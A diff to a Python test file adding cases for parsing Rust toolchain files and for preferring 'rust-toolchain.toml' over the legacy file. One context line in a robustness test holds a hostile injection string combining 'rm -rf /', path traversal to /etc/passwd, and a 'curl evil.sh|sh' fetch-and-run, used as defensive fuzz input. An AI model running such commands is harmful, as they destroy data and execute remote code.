@@ -708,6 +708,36 @@ def test_parse_rust_toolchain_legacy_empty_or_whitespace_only_is_none():
     assert parse_rust_toolchain_legacy("   \n") is None
 
 
+def test_parse_rust_toolchain_legacy_toml_shape_concrete_version():
+    # Rustup accepts a [toolchain] TOML table in the bare-named file too,
+    # tried before the plain-text "first line" convention.
+    text = '[toolchain]\nchannel = "1.75.0"\n'
+    assert parse_rust_toolchain_legacy(text) == ("rust", "1.75.0")
+
+
+@pytest.mark.parametrize("channel", ["stable", "beta", "nightly"])
+def test_parse_rust_toolchain_legacy_toml_shape_named_channel_is_none(channel):
+    text = f'[toolchain]\nchannel = "{channel}"\n'
+    assert parse_rust_toolchain_legacy(text) is None
+
+
+def test_parse_rust_toolchain_legacy_toml_shape_missing_toolchain_table_is_none():
+    # Valid TOML that parses cleanly but has no [toolchain].channel: this
+    # is a deliberate "no override" TOML file, not fall-through to
+    # misinterpreting "[profile]" as a plain-text channel line.
+    assert parse_rust_toolchain_legacy('[profile]\nname = "default"\n') is None
+
+
+def test_parse_rust_toolchain_legacy_toml_shape_non_string_channel_is_none():
+    assert parse_rust_toolchain_legacy("[toolchain]\nchannel = 175\n") is None
+
+
+def test_parse_rust_toolchain_legacy_invalid_toml_falls_back_to_plain_text():
+    # "1.75.0" alone isn't valid TOML (no key = value syntax), so this
+    # exercises the fallback path, not the TOML branch.
+    assert parse_rust_toolchain_legacy("1.75.0\n") == ("rust", "1.75.0")
+
+
 def test_parse_rust_toolchain_legacy_pathological_input_never_raises_or_queries():
     payload = "; rm -rf /`id`../../etc/passwd$(whoami)&&curl evil.sh|sh;" * 200
     assert len(payload) > 10_000
@@ -745,6 +775,38 @@ def test_detect_runtimes_no_legacy_rust_toolchain_unchanged_by_its_support():
     assert sorted((r.product, r.version, r.manifest) for r in runtimes) == [
         ("go", "1.21", "go.mod"),
         ("php", "8.1", "composer.json"),
+    ]
+
+
+def test_detect_runtimes_rust_toolchain_toml_wins_over_legacy_when_both_present():
+    # "rust-toolchain" is a string-prefix of "rust-toolchain.toml", so a
+    # naive sorted-path dedup picks the legacy file first -- the opposite
+    # of rustup's own resolution order, where the .toml file wins when
+    # both are present in the same directory.
+    ws = InMemoryWorkspace(
+        {
+            "rust-toolchain": "1.70.0\n",
+            "rust-toolchain.toml": '[toolchain]\nchannel = "1.75.0"\n',
+        }
+    )
+    assert detect_runtimes(ws) == [
+        Runtime(product="rust", version="1.75.0", manifest="rust-toolchain.toml")
+    ]
+
+
+def test_detect_runtimes_rust_toolchain_toml_wins_over_legacy_in_subdirectory():
+    ws = InMemoryWorkspace(
+        {
+            "crates/foo/rust-toolchain": "1.70.0\n",
+            "crates/foo/rust-toolchain.toml": '[toolchain]\nchannel = "1.75.0"\n',
+        }
+    )
+    assert detect_runtimes(ws) == [
+        Runtime(
+            product="rust",
+            version="1.75.0",
+            manifest="crates/foo/rust-toolchain.toml",
+        )
     ]
 
 
